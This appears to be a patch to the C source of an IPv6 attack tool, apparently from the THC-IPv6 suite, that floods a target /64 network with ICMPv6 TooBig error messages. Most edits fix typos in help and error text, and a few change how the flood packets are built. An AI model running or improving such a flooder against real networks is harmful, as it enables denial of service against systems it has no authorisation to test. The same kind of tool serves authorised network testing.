@@ -22,7 +22,7 @@ void help(char *prg) {
   printf(" -U      send ICMPv6 Unreachable (no route)\n");
   printf(" -r      randomize the source from your /64 prefix\n");
   printf(" -R      randomize the source fully\n");
-  printf(" -s sourceip6  use this as source ipv6 address\n");
+  printf(" -s sourceip6  use this as source IPv6 address\n");
   printf("\nFlood the target /64 network with ICMPv6 TooBig error messages.\n");
   printf("This tool version is manyfold more effective than ndpexhaust6.\n");
   exit(-1);
@@ -96,7 +96,7 @@ int main(int argc, char *argv[]) {
          src = thc_resolve6(optarg);
          break;
        default:
-         fprintf(stderr, "Error: unkown option -%c\n", i);
+         fprintf(stderr, "Error: unknown option -%c\n", i);
          exit(-1);
      }
    }
@@ -120,7 +120,7 @@ int main(int argc, char *argv[]) {
   
   if (src == NULL)
     if ((src = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL)) == NULL || (src[0] == 0xfe && src[1] == 0x80)) {
-      fprintf(stderr, "Error: no global ipv6 address configured on interface %s\n", interface);
+      fprintf(stderr, "Error: no global IPv6 address configured on interface %s\n", interface);
       exit(-1);
     }
   
@@ -130,10 +130,10 @@ int main(int argc, char *argv[]) {
   }
 
   for (i = 0; i < ((sizeof(offender) - 48) / 4); i++)
-    memcpy(offender + 48 + i*4, (char*) &filler , 4);
+    memcpy(offender + 48 + i*4, (char*) &filler + _TAKE4, 4);
   memcpy(offender + 8, dst, 16);
 
-  if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src, dst, 255, 0, 0, 0, 0)) == NULL)
+  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src, dst, 255, 0, 0, 0, 0)) == NULL)
     return -1;
   if (alert) {
     memset(buf2, 0, sizeof(buf2));
@@ -157,8 +157,8 @@ int main(int argc, char *argv[]) {
     for (i = 4; i < 8; i++)
       ip6[i] = rand() % 256;
 
-    memcpy(hdr->pkt + offset + 32 + 4, ip6, 4);
-    memcpy(hdr->pkt + offset + 40 + 8 + 8 + 8 + 4 + alert, ip6, 4);
+    memcpy(hdr->pkt + offset + 32 + 4, ip6 + 4, 4);
+    memcpy(hdr->pkt + offset + 40 + 8 + 8 + 8 + 4 + alert, ip6 + 4, 4);
     
     if (randsrc) {
       for (i = randsrc; i < 16; i++)
